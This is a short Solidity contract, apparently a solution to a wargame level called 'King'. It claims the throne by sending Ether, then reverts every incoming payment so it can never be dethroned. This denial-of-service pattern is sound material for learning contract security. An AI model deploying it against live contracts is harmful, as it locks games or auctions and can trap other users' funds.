// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() external payable {
        (bool success, ) = payable(target).call{value: msg.value}("");
        require(
            success,
            "Attack failed: Could not send Ether to the King contract"
        );
    }

    receive() external payable {
        revert("You shall not dethrone me!");
    }
}
